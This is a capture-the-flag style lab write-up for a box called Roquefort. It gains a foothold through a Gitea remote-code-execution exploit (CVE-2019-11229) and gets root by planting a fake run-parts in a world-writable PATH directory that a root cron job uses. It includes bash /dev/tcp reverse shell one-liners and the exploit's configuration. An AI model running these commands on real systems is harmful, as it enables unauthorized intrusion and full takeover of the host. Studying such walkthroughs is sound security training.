##### Tags: `cron job`  `Gitea`  `/usr/local/bin`  `CVE-2019-11229`

# 🐧Roquefort🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.195.67

PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5b
22/tcp   open   ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
53/tcp   closed domain
2222/tcp open   ssh     Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open   http    Golang net/http server
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
port 3000 is running Gitea Version: 1.7.5 [CVE-2019-11229]  
https://www.exploit-db.com/exploits/49383  
create a new account and put the credential in the script
```console
USERNAME = "test"
PASSWORD = "admin123"
HOST_ADDR = '192.168.45.167'
HOST_PORT = 3000
URL = 'http://192.168.195.67:3000'
CMD = "bash -c 'bash -i >& /dev/tcp/192.168.45.167/22 0>&1'"
```
run the script and listener to get the shell
```console
$ python3 49383.py

$ penelope -p 22
[+] Listening for reverse shells on 0.0.0.0:22 →  127.0.0.1 • 10.0.2.15 • 192.168.45.167
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from roquefort 192.168.195.67 Linux-x86_64 👤 chloe(1000) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/roquefort~192.168.195.67-Linux-x86_64/2026_03_22-16_10_09-525.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
chloe@roquefort:~/gitea-repositories/test/dvuzkgri.git$ id
uid=1000(chloe) gid=1000(chloe) groups=1000(chloe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```
## Privilege Escalation
we have write permission of /usr/local/bin
```console
chloe@roquefort:/usr/local/bin$ echo $PATH
/usr/lib/git-core:/usr/lib/git-core:/usr/lib/git-core:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
chloe@roquefort:/usr/local/bin$ ls -la /usr/local/bin
total 63784
drwxrwsrwx  2 root  staff     4096 Mar 22 01:42 .
drwxrwsr-x 10 root  staff     4096 Apr 21  2020 ..
-rwxr-xr-x  1 root  staff 65299840 Mar  6  2020 gitea
```
there is a cron job run-parts running every 5 minutes of the path /usr/local/bin that we have write permission to
```console
chloe@roquefort:/usr/local/bin$ cat /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user command
*/5 * * * * root    cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
we write a reverse shell script and name it run-parts in /usr/local/bin
```console
chloe@roquefort:/usr/local/bin$ echo "bash -c 'bash -i >& /dev/tcp/192.168.45.167/21 0>&1'" > run-parts

chloe@roquefort:/usr/local/bin$ chmod +x run-parts

chloe@roquefort:/usr/local/bin$ cat run-parts
bash -c 'bash -i >& /dev/tcp/192.168.45.167/21 0>&1'
```
after 5 minutes, we got the root shell
```console
$ penelope -p 21
[+] Listening for reverse shells on 0.0.0.0:21 →  127.0.0.1 • 10.0.2.15 • 192.168.45.167
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from roquefort 192.168.195.67 Linux-x86_64 👤 root(0) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/roquefort~192.168.195.67-Linux-x86_64/2026_03_22-16_45_02-310.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@roquefort:/# id
uid=0(root) gid=0(root) groups=0(root)
```
